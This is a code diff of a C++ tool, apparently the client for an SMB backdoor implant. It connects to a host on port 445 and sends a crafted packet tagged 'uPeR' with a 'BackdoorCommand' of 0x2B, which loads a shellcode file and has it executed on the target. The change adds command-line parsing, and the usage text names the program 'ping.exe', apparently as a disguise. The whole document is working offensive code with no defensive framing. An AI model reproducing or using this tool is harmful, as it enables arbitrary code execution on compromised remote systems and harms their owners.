@@ -34,34 +34,41 @@ int main(int argc, char* argv[]) {
 	client.sin_family = AF_INET;
 	client.sin_port = htons(445);
 	
-	InetPtonA(AF_INET, argv[1], &client.sin_addr);
-	connect(sock, (sockaddr*)&client, sizeof(client));
+	if (argc < 6) {
+		printf("\nping.exe -h <host_ip> -c <cmd> -p <payload>\nExample: ping.exe -h 127.0.0.1 -c exec -p D:\\shellcode.bin");
+		return 0;
+	}
+	else if (!strcmp(argv[4], "exec") && argv[6]!=NULL)
+	{
+		InetPtonA(AF_INET, argv[2], &client.sin_addr);
+		connect(sock, (sockaddr*)&client, sizeof(client));
 
-	REPULSAR_EXECUTE exec;
+		REPULSAR_EXECUTE exec;
 
-	exec.NetBios = 0x0;
-	exec.SmbHeader[0] = 'u';
-	exec.SmbHeader[1] = 'P';
-	exec.SmbHeader[2] = 'e';
-	exec.SmbHeader[3] = 'R';
-	exec.BackdoorCommand = 0x2B;	//0x2b execute code
+		exec.NetBios = 0x0;
+		exec.SmbHeader[0] = 'u';
+		exec.SmbHeader[1] = 'P';
+		exec.SmbHeader[2] = 'e';
+		exec.SmbHeader[3] = 'R';
+		exec.BackdoorCommand = 0x2B;	//0x2b execute code
 
-	exec.NetBiosLength = htons((sizeof(REPULSAR_EXECUTE) - 0x4)); //4Bytes netbios struct
+		exec.NetBiosLength = htons((sizeof(REPULSAR_EXECUTE) - 0x4)); //4Bytes netbios struct
 
-	std::vector<char> USERMODE_SHELLCODE;
-	USERMODE_SHELLCODE = byte_read(argv[2]);
-	exec.ShellcodeLength = USERMODE_SHELLCODE.size();
+		std::vector<char> USERMODE_SHELLCODE;
+		USERMODE_SHELLCODE = byte_read(argv[6]);
+		exec.ShellcodeLength = USERMODE_SHELLCODE.size();
 
 
-	memset(exec.shellcode, 0, USERMODE_SHELLCODE.size()); //1Byte 0-terminated array
-	memcpy(exec.shellcode, USERMODE_SHELLCODE.data(), USERMODE_SHELLCODE.size());
+		memset(exec.shellcode, 0, USERMODE_SHELLCODE.size()); //1Byte 0-terminated array
+		memcpy(exec.shellcode, USERMODE_SHELLCODE.data(), USERMODE_SHELLCODE.size());
 
-	printf("SHELLCODE SIZE 0x%x\n", exec.ShellcodeLength);
-	printf("Sending SMB packet wit tag 0x%x and command 0x%X...\n", *(PULONG)exec.SmbHeader, exec.BackdoorCommand);
-	printf("Your shellcode will be executed!\n");
-	send(sock, (const char*)&exec, sizeof(REPULSAR_EXECUTE), 0);
+		printf("SHELLCODE SIZE 0x%x\n", exec.ShellcodeLength);
+		printf("Sending SMB packet wit tag 0x%x and command 0x%X...\n", *(PULONG)exec.SmbHeader, exec.BackdoorCommand);
+		printf("Your shellcode will be executed!\n");
+		send(sock, (const char*)&exec, sizeof(REPULSAR_EXECUTE), 0);
 
-	printf("--------Done!\n");
+		printf("--------Done!\n");
+	}
 	
 	return 0;
 }
